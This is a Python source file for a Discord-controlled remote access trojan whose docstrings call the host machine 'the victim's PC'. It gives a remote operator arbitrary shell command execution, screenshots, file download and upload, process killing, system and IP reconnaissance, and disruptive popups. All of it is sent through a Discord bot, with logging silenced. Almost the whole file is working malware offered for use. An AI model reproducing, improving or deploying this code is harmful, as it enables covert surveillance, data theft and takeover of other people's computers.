import discord
from discord.ext import commands
from discord import app_commands
import tkinter as tk
import requests
import webbrowser
import platform
import psutil
import os
import logging
import subprocess
import socket
import asyncio
import PIL
from PIL import ImageGrab
import cv2
from cv2 import *


intents = discord.Intents.all()


bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)


logging.basicConfig(level=logging.CRITICAL)


logging.basicConfig(level=logging.ERROR)


logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.ext.commands').setLevel(logging.CRITICAL)


logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)


def display_message(message):
    root = tk.Tk()
    root.geometry("700x200")
    root.title("Hello There!")
    frame = tk.Frame(root)
    frame.pack(expand=True)
    label = tk.Label(frame, text=message, font=("Arial", 25))
    label.pack(pady=10, padx=10, anchor='center')
    
    root.mainloop()


def get_ipV4():
    try:
        hostname = socket.gethostname()
        ipv4_address = socket.gethostbyname(hostname)
        return ipv4_address
    except Exception as e:
        return None
def get_ipV4_public():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        return public_ip
    except requests.RequestException as e:
        return None

@bot.event
async def on_ready():
    try:
        await bot.tree.sync()
    except Exception as e:
        return None
@bot.tree.command(name = "ipv4")
async def ipV4(interaction: discord.Interaction):
    """Shows ipV4 address"""
    await interaction.response.defer()
    ip_address = get_ipV4()
    if ip_address:
        await interaction.followup.send(f"The computer Ip address is: {ip_address}")
    else:
        await interaction.followup.send("Error")
@bot.tree.command(name = "ipv4_public")
async def ipV4_public(interaction: discord.Interaction):
    """Shows ipV4 public address"""
    await interaction.response.defer()
    ip_address = get_ipV4_public()
    if ip_address:
        await interaction.followup.send(f"The computer Ip address is: {ip_address}")
    else:
        await interaction.followup.send("Error")

@bot.tree.command(name = "message")
@app_commands.describe(message = "Message to Display")
async def message(interaction, *, message: str):
    """Pops up a window at enemys computer with message"""
    await interaction.response.defer()
    display_message(message)
    await interaction.followup.send("Message sent successfully")
@bot.tree.command(name = "flashbang")
async def flashbang(interaction: discord.Interaction):
    """FLASHBANG!"""
    await interaction.response.defer()
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg='red')
    root.mainloop()
    await interaction.followup.send("FLASHBANGED successfully")


@bot.tree.command(name = "info")
async def info(interaction: discord.Interaction):
    """Shows computers info"""
    await interaction.response.defer()
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"

    await interaction.followup.send(f"```{system_info}```")


current_directory = os.getcwd()

@bot.tree.command(name = "run")
@app_commands.describe(cmd = "CMD command to run")
async def run(interaction, *, cmd: str):
    """Runs a CMD command in the victim's PC"""
    try:
        await interaction.response.defer()
        global current_directory
        if cmd.startswith("format") or cmd.startswith("del") or cmd.startswith("rmdir"):
            await interaction.followup.send(f"Command not allowed")
            return
        if cmd.startswith("cd"):
            new_dir = cmd[3:].strip()
            if new_dir == '/':
                if os.name == 'nt':
                    new_dir = 'C:\\'
                else:
                    new_dir = '/'
            new_dir = os.path.abspath(os.path.join(current_directory, new_dir))
            if os.path.isdir(new_dir):
                os.chdir(new_dir)
                current_directory = new_dir
                await interaction.followup.send(f"Directory changed to: {new_dir}")
            else:
                await interaction.followup.send(f"Directory not found: {new_dir}")
        else:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=current_directory
            )
            stdout, stderr = await process.communicate()
            stdout_str = stdout.decode()
            stderr_str = stderr.decode()
            if process.returncode == 0:
                if len(stdout_str) <= 2000:
                    await interaction.followup.send(f"```{stdout_str}```")
                else:
                    with open('output.txt', 'w', encoding='utf-8') as file:
                        file.write(stdout_str)
                    await interaction.followup.send(file=discord.File('output.txt'))
                    os.remove('output.txt')
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {str(e)}")


@bot.tree.command(name = "kill")
@app_commands.describe(pid = "PID of the programm to kill")
async def kill(interaction, pid: int):
    """Kills the programm with the pid"""
    try:
        await interaction.response.defer()
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()
        await interaction.followup.send(f"Process with PID {pid} ({process_name}) has been terminated.")
    except psutil.NoSuchProcess:
        await interaction.followup.send(f"no process found with PID {pid}.")

@bot.tree.command(name = "download")
@app_commands.describe(path = "Path of the file to download")
async def download(interaction, path: str):
    """Allows you to download a file from the given path"""
    if os.path.exists(path):
        if os.path.getsize(path) <= 8 * 1024 * 1024:
            try:
                await interaction.response.defer()
                with open(path, 'rb') as file:
                    await interaction.followup.send(file=discord.File(file))
            except Exception as e:
                await interaction.followup.send(f"An error occurred while sending the file: {e}")
        else:
            await interaction.followup.send("The file is too large to send (max 8 MB).")
    else:
        await interaction.followup.send("Sorry, the specified file path does not exist.")

@bot.tree.command(name = "screenshot")
async def screenshot(interaction: discord.Interaction):
    """Gets a screenshot of the victim"""
    try:
        await interaction.response.defer()
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await interaction.followup.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
        
    except Exception as e:
        await interaction.followup.send(f"An error occurred while sending the file: {e}")
@bot.tree.command(name = "upload")
@app_commands.describe(file = "File to upload")
async def upload(interaction: discord.Interaction, file: discord.Attachment):
    """Allows you to upload a file into enemys computer"""
    if file is None:
        await interaction.followup.send("attach a file")
        return
    attachment = file
    file_name = attachment.filename

    try:
        await interaction.response.defer()
        await attachment.save(file_name)
        await interaction.followup.send(f"File '{file_name}' has been uploaded.")
    except Exception as e:
        await interaction.followup.send(f"error uploading file: {e}")

bot.run('token')
